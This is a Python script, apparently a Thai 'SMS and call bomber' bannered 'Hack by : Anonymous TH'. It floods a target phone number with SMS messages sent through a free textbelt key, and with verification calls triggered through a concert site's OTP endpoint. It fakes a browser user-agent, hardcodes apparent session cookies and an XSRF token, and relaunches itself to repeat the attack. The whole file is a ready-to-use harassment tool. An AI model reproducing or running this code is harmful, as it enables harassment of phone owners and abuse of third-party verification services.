import os,sys,time
import random

#<####check_module####>#
try:
	import requests
except ImportError:
	os.system("pkg update")
	os.system("pip install requests")
	os.system("python bom.py")
#--------------------------------------------------
	
#<####color text####>#
red = '\033[1;91m'
yellow = '\033[1;93m'
green = '\033[1;92m'
blue1 = '\033[1;96m'
purple = '\033[1;95m'
blue2 = '\033[1;94m'
white = '\033[0m'
#--------------------------------------------------

def s():
	print(f'''{green}

█⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⣠⣤⣴⡶⠶⠾⠿⠛⠛⠛⠛⠿⠿⠶⢶⣦⣤⣄⣀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⣤⡶⠟⠛⠉⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠉⠛⠻⢶⣤⣀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⣴⠾⠋⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠙⠷⣦⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣠⡼⠋⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠙⢷⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⣠⡾⠋⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢷⣄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⣀⡾⠏⠄⠄⠄⠄⢀⣀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⡀⠄⠄⠄⠄⠹⢷⣀⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⢀⣼⠏⠄⠄⠄⡀⣰⣾⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠻⣷⣦⢀⠄⠄⠄⠹⣷⡀⠄⠄⠄⠄
⠄⠄⠄⠄⡾⠃⠄⢀⣴⠋⣴⣿⢋⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡙⣿⣦⠙⣦⡀⠄⠘⢷⡄⠄⠄⠄
⠄⠄⠄⣼⠁⠄⢀⣿⡏⢰⠟⢡⡎⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⡠⣤⣀⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢱⣌⠻⡇⢹⣿⡀⠄⠈⢧⠄⠄⠄
⠄⠄⣼⠏⣠⡎⢸⣿⢣⣥⡾⠏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⠿⠄⠈⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢷⣬⣜⣿⡇⢱⣄⠸⣧⠄⠄
⠄⣸⡟⠄⣿⡇⢸⣷⡿⢋⡔⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡼⠛⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢢⡙⢿⣾⡇⢸⣿⡀⢻⣇⠄
⢀⣿⠁⠄⣿⣧⠸⢋⣴⡿⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢿⣦⡙⠇⣸⣿⡇⠈⣿⡀
⢸⡏⠄⡄⣿⡿⣰⣿⡿⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢿⡿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢿⣿⣆⢻⣿⢣⠄⢹⡇
⣾⡇⢠⣧⠹⣧⡿⠋⣰⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠄⠠⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣦⠙⢿⣼⠏⢸⡄⢸⣿
⣿⠄⠘⣿⡀⢻⢁⣼⡟⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣴⠄⠛⢿⡿⠛⠄⣲⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣧⡈⡿⢀⣾⠃⠄⣿
⣿⠄⠄⢿⣷⠄⣾⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣿⡏⠄⠠⢻⡟⠄⠄⢹⣿⣶⣦⣤⣤⣀⣀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⣿⣷⠄⣾⡿⠄⠄⣿
⢿⡇⢰⠘⣿⡇⣿⡏⢸⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⣼⣧⠄⠄⢈⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⢀⡇⢹⣿⢸⣿⠇⡆⢸⡿
⢸⣇⠈⣷⠈⢻⣿⠄⣼⣇⠄⠄⠄⠄⠄⠄⠄⠄⢀⣿⣿⣿⣿⣿⣿⣿⣧⠄⠄⣿⣿⠄⠄⣼⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⣸⣧⠄⣿⡟⠁⣼⠁⣸⡇
⠈⣿⡀⠹⣷⣄⠙⠄⣿⣿⢀⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣆⠄⣿⣿⠄⣰⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⡀⣿⣿⠄⠋⣠⣾⡏⢀⣿⠁
⠄⢹⣧⠄⠻⣿⣷⡄⣿⣿⠄⣇⠄⠄⠄⠄⠄⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠄⠄⠄⠄⠄⠄⣠⠄⣿⣿⢠⣾⣿⠟⠄⣼⡏⠄
⠄⠄⢻⣆⠡⣈⠻⠿⣞⣿⡄⢸⣆⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⣰⣿⢠⣿⣳⠿⠟⣁⠌⢰⡿⠄⠄
⠄⠄⠄⢻⡀⠹⣷⣦⣀⠙⠳⣸⣿⣇⢀⡀⠄⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⢀⡀⣸⣿⡏⠞⠋⣀⣴⣾⠏⢀⡞⠄⠄⠄
⠄⠄⠄⠄⢷⡄⠈⠻⢿⣿⣷⣆⡻⣿⡄⢻⣦⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣴⡟⢠⣿⢟⣠⣾⣿⡿⠟⠁⢠⡾⠃⠄⠄⠄
⠄⠄⠄⠄⠈⢿⣆⠄⠄⣉⠛⠿⢿⣮⣿⣄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
''')

#banner
def banner():
	print(f'''{red}

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣷⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠻⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣁⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠛⠉⠛⠶⠀⠀⢐⠿⠋⠀⢨⣿⣿⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢷⣿⣿⣶⠀⠀⠉⢶⣿⣿⠿⢿⣿⣿⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣶⡶⠂⠀⣀⠀⢀⡄⠐⢲⡾⣻⣿⣿⣿⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣯⢿⡶⣶⣿⣟⣿⡶⠶⣿⢣⣿⣿⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⣧⠛⠒⠠⣤⣤⠶⠾⢣⣿⣿⣿⣿⣿⣤⣀⠀⠀⠀
⢀⣠⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⢿⣿⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                   {white}[{purple}Hack by : Anonymous TH{white}]
''')
os.system("clear")
banner()
print(' ')
print(f'{white}[ {red}√{white} ] {green}Versions : {blue1}4.1.0')
print(f'{white}[ {red}#{white} ] {green}Script   : {blue1}email & call')
print(f'{white}[ {red}?{white} ] {green}Script   : {blue1}FREE')
print(f'{white}[ {red}¥{white} ] {green}Author   : {blue1}Aimbot')
print(' ')
print('''\033[1;90m----------------------------------------------------------------------

[1] SmS Message
[2] CALL
''')
print(' ')
choice = input(f'{white}[{red}?{white}] {green}Please enter number : {purple}')
if choice == '1':
	os.system("clear")
	banner()
	phone = input(f'{white}[{red}?{white}] {green}Please enter your mobile : {purple}')
	msg = input(f'{white}[{red}?{white}] {green}Please enter message : {purple}')
	print(' ')
	time.sleep(2)
	os.system("clear")
	
	def api1():
		requests.post('https://textbelt.com/text',data={"phone": f"+66{phone[1:]}","message": msg,"key": "textbelt"})
		s()
		print("")
		print(f"\033[1;92mPHONE : {phone}")
		print(f"\033[1;92mMESSAGE : {msg}")
		print("")
		
	api1()
	os.system("python bom.py")
	
if choice == '2':
	os.system("clear")
	banner()
	phone = input(f'{white}[{red}?{white}] {green}Please enter your mobile : {purple}')
	print(' ')
	time.sleep(2)
	os.system("clear")
	
	def api():
		requests.post("https://www.theconcert.com/rest/request-otp",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"})
		s()
		print("")
		print(f"\033[1;92mPHONE : {phone}")
		print("")
		
	api()
	time.sleep(1)
	os.system("python bom.py")







	
